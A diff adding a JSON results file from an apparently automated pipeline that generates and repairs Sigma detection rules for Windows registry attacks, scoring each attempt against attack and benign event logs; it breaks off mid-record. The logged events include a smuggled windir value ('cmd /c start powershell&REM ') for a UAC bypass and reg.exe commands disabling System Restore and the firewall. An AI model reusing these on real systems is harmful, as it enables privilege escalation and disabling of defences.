+        "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       },
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:53.645",
+        "ProcessGuid": "{0197231e-03e9-69b1-bc1a-000000000800}",
+        "ProcessId": "8776",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableConfig",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       },
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:54.362",
+        "ProcessGuid": "{0197231e-03ea-69b1-bd1a-000000000800}",
+        "ProcessId": "9004",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableSR",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       }
+      ],
+      "seconds": 11.09
+     },
+     "tokens": 1237,
+     "latency_s": 4.78,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Disable System Restore via Registry\",\n \"description\": \"Detects modification of the Windows Registry to disable System Restore by setting the DisableSR value under the\\n  SystemRestore key.\",\n \"tags\": [\n  \"attack.impact\",\n  \"attack.t1490\"\n ],\n \"logsource_category\": \"registry_set\",\n \"groups\": [],\n \"condition\": \"selection\",\n \"falsepositives\": [\n  \"Legitimate administrative scripts that modify System Restore settings may trigger this rule.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "e96e1f1ae2a401c5fa2558f0ee742673937f484e280e41eeaf542bf1747fb039",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no detection groups"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 12545,
+     "latency_s": 44.84,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Disable System Restore via Registry\nid: fad38f8b-901e-405c-8016-e5d3e0f8c126\nstatus: experimental\ndescription: \"Detects modification of the Windows Registry to disable System Restore by setting the DisableSR value under\\\n  \\ the\\n  SystemRestore key.\"\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.impact\n- attack.t1490\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection:\n    EventType: SetValue\n    KeyPath|contains: \\SystemRestore\\\n    ValueName: DisableSR\n    Data: /dword:00000001/\n  condition: selection\nfalsepositives:\n- Legitimate administrative scripts that modify System Restore settings may trigger this rule.\nlevel: high\n",
+     "sha256": "ebed26283a1dde7c4d69cf4f44acade158ff44b22ab29915da5092f1d33d5851",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "5de03871-5d46-4539-a82d-3aa992a69a83.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:53.547",
+        "ProcessGuid": "{0197231e-03e9-69b1-ba1a-000000000800}",
+        "ProcessId": "9860",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       },
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:53.581",
+        "ProcessGuid": "{0197231e-03e9-69b1-bb1a-000000000800}",
+        "ProcessId": "6164",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       },
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:53.645",
+        "ProcessGuid": "{0197231e-03e9-69b1-bc1a-000000000800}",
+        "ProcessId": "8776",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableConfig",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       },
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2026-03-11 05:55:54.362",
+        "ProcessGuid": "{0197231e-03ea-69b1-bd1a-000000000800}",
+        "ProcessId": "9004",
+        "Image": "C:\\WINDOWS\\system32\\reg.exe",
+        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableSR",
+        "Details": "DWORD (0x00000001)",
+        "User": "swachchhanda\\xodih"
+       }
+      ],
+      "seconds": 12.25
+     },
+     "tokens": 957,
+     "latency_s": 5.08,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Disable System Restore via Registry\",\n \"description\": \"Detects modification of the Windows Registry to disable System Restore by setting the DisableSR value under\\\\\\n  the SystemRestore key.\",\n \"tags\": [\n  \"attack.impact\",\n  \"attack.t1490\"\n ],\n \"logsource_category\": \"registry_set\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate administrative scripts that modify System Restore settings may trigger this rule.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "d2963672b05d2dd61ff79a003367b836f714ecf9147a17958adbf51d469096c7",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 12935,
+     "latency_s": 50.78,
+     "evaluator_error": null,
+     "resamples": 3
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 4,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 10.97
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Registry Disable System Restore\nid: 5de03871-5d46-4539-a82d-3aa992a69a83\nrelated:\n    - id: 7c06ab9b-b1d2-4ba9-b06e-09491ded20d9\n      type: similar\nstatus: test\ndescription: Detects the modification of the registry to disable a system restore on the computer\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-9---disable-system-restore-through-registry\nauthor: frack113\ndate: 2022-04-04\nmodified: 2023-08-17\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains:\n            - '\\Policies\\Microsoft\\Windows NT\\SystemRestore'\n            - '\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore'\n        TargetObject|endswith:\n            - DisableConfig\n            - DisableSR\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\nregression_tests_path: regression_data/rules/windows/registry/registry_set/registry_set_disable_system_restore/info.yml\nsimulation:\n    - type: atomic-red-team\n      name: Disable System Restore Through Registry\n      technique: T1490\n      atomic_guid: 66e647d1-8741-4e43-b7c1-334760c2047f\n"
+  },
+  {
+   "task": {
+    "rule_id": "724ea201-6514-4f38-9739-e5973c34f49a",
+    "rule_path": "rules/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task.yml",
+    "title": "Bypass UAC Using SilentCleanup Task",
+    "category": "registry_set",
+    "date": "2022-01-06",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/724ea201-6514-4f38-9739-e5973c34f49a.evtx",
+    "sample_sha256": "b0a9a65356fdb567afcd9c0cb5956acf84577c03064e2a3358d0c230f0a87388"
+   },
+   "spec": {
+    "behavior": "JSON object with keys observables and techniques.",
+    "logsource_category": "process_creation",
+    "observables": [
+     {
+      "field": "environment_variable_name",
+      "match": "equals",
+      "value": "windir",
+      "quote": "Detects the setting of the environement variable \"windir\" to a non default value."
+     },
+     {
+      "field": "command_line",
+      "match": "contains",
+      "value": "%windir%\\system32\\cleanmgr.exe",
+      "quote": "The SilentCleanup task located in %windir%\\system32\\cleanmgr.exe is an auto-elevated task"
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1548.002",
+      "quote": "ATT&CK tags: attack.privilege-escalation, attack.t1548.002"
+     }
+    ]
+   },
+   "spec_dropped": [],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Potential UAC Bypass via SilentCleanup Task with Modified Windir Environment Variable\nid: bbdb2d1d-ccff-4d08-aac6-268e6063497d\nstatus: experimental\ndescription: Detects attempts to modify the WINDDIR environment variable before launching the SilentCleanup task (cleanmgr.exe)\n  to bypass UAC.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.privilege-escalation\n- attack.t1548.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  set_windir:\n    CommandLine|contains: windir=\n  silentcleanup:\n    CommandLine|contains: '%windir%\\system32\\cleanmgr.exe'\n  condition: set_windir and silentcleanup\nfalsepositives:\n- Legitimate scripts that temporarily change WINDDIR for testing\nlevel: high\n",
+     "sha256": "d26cf39eafd018eaeb5291c3f22a98289ead8c4f41da19da9c3a005a94c8f70f",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "724ea201-6514-4f38-9739-e5973c34f49a.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2025-10-26 17:50:12.565",
+        "ProcessGuid": "{5aa13a44-5f54-68fe-b455-000000004002}",
+        "ProcessId": "2768",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "TargetObject": "HKU\\S-1-5-21-3960063115-309473240-3247002503-500\\Environment\\windir",
+        "Details": "cmd /c start powershell&REM ",
+        "User": "ATTACKRANGE\\Administrator"
+       }
+      ],
+      "seconds": 14.58
+     },
+     "tokens": 2048,
+     "latency_s": 7.99,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "title: Potential UAC Bypass via SilentCleanup Task with Modified Windir Environment Variable\nid: bbdb2d1d-ccff-4d08-aac6-268e6063497d\nstatus: experimental\ndescription: Detects attempts to modify the WINDDIR environment variable before launching the SilentCleanup task (cleanmgr.exe)\n  to bypass UAC.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.privilege-escalation\n- attack.t1548.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  set_windir:\n    CommandLine|contains: windir=\n  windir_reg:\n    EventID: '13'\n    TargetObject|endswith: \\Environment\\windir\n  silentcleanup:\n    CommandLine|contains: '%windir%\\system32\\cleanmgr.exe'\n  condition: (set_windir or windir_reg) and silentcleanup\nfalsepositives:\n- Legitimate scripts that temporarily change WINDDIR for testing\nlevel: high\n",
+     "sha256": "b58f2fd66ab0c04661c345d3e5d2b4c36a6c7c904f27114a54bbdd6f6102b4eb",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "=== Issues ===\nissue=NumberAsStringIssue severity=low description=A number was expressed as string rule=<tmp>\\proc_creation_win_shakedown_candidate.yml string=13\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 1 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+---------------------+----------+----------------------------------+\n| Count | Issue               | Severity | Description                      |\n+-------+---------------------+----------+----------------------------------+\n| 1     | NumberAsStringIssue | LOW      | A number was expressed as string |\n+-------+---------------------+----------+----------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "724ea201-6514-4f38-9739-e5973c34f49a.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2025-10-26 17:50:12.565",
+        "ProcessGuid": "{5aa13a44-5f54-68fe-b455-000000004002}",
+        "ProcessId": "2768",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "TargetObject": "HKU\\S-1-5-21-3960063115-309473240-3247002503-500\\Environment\\windir",
+        "Details": "cmd /c start powershell&REM ",
+        "User": "ATTACKRANGE\\Administrator"
+       }
+      ],
+      "seconds": 9.84
+     },
+     "tokens": 8944,
+     "latency_s": 50.36,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Potential UAC Bypass via SilentCleanup Task with Modified Windir Environment Variable\nid: bbdb2d1d-ccff-4d08-aac6-268e6063497d\nstatus: experimental\ndescription: Detects attempts to modify the WINDDIR environment variable before launching the SilentCleanup task (cleanmgr.exe)\n  to bypass UAC.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.privilege-escalation\n- attack.t1548.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  set_windir:\n    CommandLine|contains: windir=\n  windir_reg:\n    EventID: '13'\n    TargetObject|endswith: \\Environment\\windir\n  silentcleanup:\n    CommandLine|contains: \\system32\\cleanmgr.exe\n  condition: (set_windir or windir_reg) and silentcleanup\nfalsepositives:\n- Legitimate scripts that temporarily change WINDDIR for testing\nlevel: high\n",
+     "sha256": "e6b4dee1c15a391308053bc5ef5ee5989841f38b8e6c3c6c169dfe6de79c53d8",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "=== Issues ===\nissue=NumberAsStringIssue severity=low description=A number was expressed as string rule=<tmp>\\proc_creation_win_shakedown_candidate.yml string=13\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 1 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+---------------------+----------+----------------------------------+\n| Count | Issue               | Severity | Description                      |\n+-------+---------------------+----------+----------------------------------+\n| 1     | NumberAsStringIssue | LOW      | A number was expressed as string |\n+-------+---------------------+----------+----------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "724ea201-6514-4f38-9739-e5973c34f49a.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2025-10-26 17:50:12.565",
+        "ProcessGuid": "{5aa13a44-5f54-68fe-b455-000000004002}",
+        "ProcessId": "2768",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "TargetObject": "HKU\\S-1-5-21-3960063115-309473240-3247002503-500\\Environment\\windir",
+        "Details": "cmd /c start powershell&REM ",
+        "User": "ATTACKRANGE\\Administrator"
+       }
+      ],
+      "seconds": 9.45
+     },
+     "tokens": 4163,
+     "latency_s": 25.59,
+     "evaluator_error": null,
+     "resamples": 1
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "title: Potential UAC Bypass via SilentCleanup Task with Modified Windir Environment Variable\nid: bbdb2d1d-ccff-4d08-aac6-268e6063497d\nstatus: experimental\ndescription: Detects attempts to modify the WINDDIR environment variable before launching the SilentCleanup task (cleanmgr.exe)\n  to bypass UAC.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.privilege-escalation\n- attack.t1548.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  set_windir:\n    CommandLine|contains: windir=\n  windir_reg:\n    EventID: '13'\n    TargetObject|endswith: \\\\Environment\\\\windir\n  silentcleanup:\n    CommandLine|contains: \\\\system32\\\\cleanmgr.exe\n  condition: (set_windir and silentcleanup) or windir_reg\nfalsepositives:\n- Legitimate scripts that temporarily change WINDDIR for testing\nlevel: high\n",
+     "sha256": "0e3364f04355b7e61dd4d851e11b5d5f8f521670c9a7132607c17a447d5198a5",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "=== Issues ===\nissue=NumberAsStringIssue severity=low description=A number was expressed as string rule=<tmp>\\proc_creation_win_shakedown_candidate.yml string=13\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 1 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+---------------------+----------+----------------------------------+\n| Count | Issue               | Severity | Description                      |\n+-------+---------------------+----------+----------------------------------+\n| 1     | NumberAsStringIssue | LOW      | A number was expressed as string |\n+-------+---------------------+----------+----------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "724ea201-6514-4f38-9739-e5973c34f49a.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2025-10-26 17:50:12.565",
+        "ProcessGuid": "{5aa13a44-5f54-68fe-b455-000000004002}",
+        "ProcessId": "2768",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "TargetObject": "HKU\\S-1-5-21-3960063115-309473240-3247002503-500\\Environment\\windir",
+        "Details": "cmd /c start powershell&REM ",
+        "User": "ATTACKRANGE\\Administrator"
+       }
+      ],
+      "seconds": 9.38
+     },
+     "tokens": 3269,
+     "latency_s": 19.61,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 9.0
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Bypass UAC Using SilentCleanup Task\nid: 724ea201-6514-4f38-9739-e5973c34f49a\nstatus: test\ndescription: |\n    Detects the setting of the environement variable \"windir\" to a non default value.\n    Attackers often abuse this variable in order to trigger a UAC bypass via the \"SilentCleanup\" task.\n    The SilentCleanup task located in %windir%\\system32\\cleanmgr.exe is an auto-elevated task that can be abused to elevate any file with administrator privileges without prompting UAC.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-9---bypass-uac-using-silentcleanup-task\n    - https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n    - https://www.fortinet.com/blog/threat-research/enter-the-darkgate-new-cryptocurrency-mining-and-ransomware-campaign\nauthor: frack113, Nextron Systems\ndate: 2022-01-06\nmodified: 2024-01-30\ntags:\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        TargetObject|endswith: '\\Environment\\windir'\n    filter_main_default:\n        Details: '%SystemRoot%'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\nregression_tests_path: regression_data/rules/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/info.yml\nsimulation:\n    - type: atomic-red-team\n      name: Bypass UAC using SilentCleanup Task\n      technique: T1548.002\n      atomic_guid: 28104f8a-4ff1-4582-bcf6-699dce156608\n"
+  },
+  {
+   "task": {
+    "rule_id": "974515da-6cc5-4c95-ae65-f97f9150ec7f",
+    "rule_path": "rules/windows/registry/registry_set/registry_set_disable_defender_firewall.yml",
+    "title": "Disable Microsoft Defender Firewall via Registry",
+    "category": "registry_set",
+    "date": "2022-01-09",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/registry/registry_set/registry_set_disable_defender_firewall/974515da-6cc5-4c95-ae65-f97f9150ec7f.evtx",
+    "sample_sha256": "c82c63c50692659325ab1e12410c945350c3e9cd0871f61e06a9273932d97b28"
+   },
+   "spec": {
+    "behavior": "complete",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1562.004",
+      "quote": "- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-2---disable-microsoft-defender-firewall-via-registry"
+     },
+     {
+      "id": "T1686.003",
+      "quote": "ATT&CK tags: attack.defense-impairment, attack.t1686.003"
+     }
+    ]
+   },
+   "spec_dropped": [],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 3,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "{\n \"title\": \"Disable Microsoft Defender Firewall via Registry\",\n \"description\": \"Detects attempts to disable Windows Defender Firewall by modifying the EnableFirewall registry value via reg.exe.\",\n \"tags\": [\n  \"attack.defense-impairment\",\n  \"attack.t1562.004\",\n  \"attack.t1686.003\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [\n  {\n   \"name\": \"selection\",\n   \"fields\": [\n    {\n     \"field\": \"Image\",\n     \"modifier\": \"endswith\",\n     \"values\": [\n      \"\\\\reg.exe\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"contains\",\n     \"values\": [\n      \"EnableFirewall\"\n     ]\n    },\n    {\n     \"field\": \"CommandLine\",\n     \"modifier\": \"contains\",\n     \"values\": [\n      \"/d 0\"\n     ]\n    }\n   ]\n  }\n ],\n \"condition\": \"selection\",\n \"falsepositives\": [\n  \"Legitimate administrative changes to firewall policy via registry are rare but possible.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "27a04605e7475747e659269a54d05d1891d75022e14082289b40f88a61e34eed",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: group 'selection': duplicate field/modifier 'CommandLine|contains'; put all its values in one entry"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 1348,
+     "latency_s": 4.67,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "title: Disable Microsoft Defender Firewall via Registry\nid: ffe89f82-3959-4d4b-a84a-f2668418b969\nstatus: experimental\ndescription: Detects attempts to disable Windows Defender Firewall by modifying the EnableFirewall registry value via reg.exe.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.defense-impairment\n- attack.t1562.004\n- attack.t1686.003\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\reg.exe\n    CommandLine|contains:\n    - EnableFirewall\n    - /d 0\n  condition: selection\nfalsepositives:\n- Legitimate administrative changes to firewall policy via registry are rare but possible.\nlevel: high\n",
+     "sha256": "40287938e58245a39400caf02c25a8387790d7c6bd41ac365be59c29d277f71d",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "=== Issues ===\nissue=InvalidATTACKTagIssue severity=medium description=Invalid MITRE ATT&CK tagging rule=<tmp>\\proc_creation_win_shakedown_candidate.yml tag=attack.t1562.004\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 1 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+-----------------------+----------+------------------------------+\n| Count | Issue                 | Severity | Description                  |\n+-------+-----------------------+----------+------------------------------+\n| 1     | InvalidATTACKTagIssue | MEDIUM   | Invalid MITRE ATT&CK tagging |\n+-------+-----------------------+----------+------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "974515da-6cc5-4c95-ae65-f97f9150ec7f.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "-",
+        "EventType": "SetValue",
+        "UtcTime": "2025-10-26 18:36:31.258",
+        "ProcessGuid": "{5aa13a44-6a2f-68fe-0857-000000004002}",
+        "ProcessId": "9720",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall",
+        "Details": "DWORD (0x00000000)",
+        "User": "ATTACKRANGE\\Administrator"
+       }
+      ],
+      "seconds": 10.84
+     },
+     "tokens": 832,
+     "latency_s": 2.34,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Disable Microsoft Defender Firewall via Registry\nid: ffe89f82-3959-4d4b-a84a-f2668418b969\nstatus: experimental\ndescription: Detects attempts to disable Windows Defender Firewall by modifying the EnableFirewall registry value via reg.exe.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.defense-impairment\n- attack.t1562.004\n- attack.t1686.003\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_proc:\n    Image|endswith: \\reg.exe\n    CommandLine|contains:\n    - EnableFirewall\n    - /d 0\n  selection_reg:\n    Image|endswith: \\reg.exe\n    TargetObject|contains: EnableFirewall\n    Details|contains: '0x00000000'\n  condition: selection_proc or selection_reg\nfalsepositives:\n- Legitimate administrative changes to firewall policy via registry are rare but possible.\nlevel: high\n",
+     "sha256": "9481225bdc0a39f159c5cfff4e8e44d18a5ef02d48e36159df66c7abb903deb3",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "=== Issues ===\nissue=InvalidATTACKTagIssue severity=medium description=Invalid MITRE ATT&CK tagging rule=<tmp>\\proc_creation_win_shakedown_candidate.yml tag=attack.t1562.004\n\n=== Summary ===\nFound 0 errors, 0 condition errors and 1 issues.\nNo rule errors found.\nNo condition errors found.\n\nValidation issue summary:\n+-------+-----------------------+----------+------------------------------+\n| Count | Issue                 | Severity | Description                  |\n+-------+-----------------------+----------+------------------------------+\n| 1     | InvalidATTACKTagIssue | MEDIUM   | Invalid MITRE ATT&CK tagging |\n+-------+-----------------------+----------+------------------------------+\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "974515da-6cc5-4c95-ae65-f97f9150ec7f.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 13,
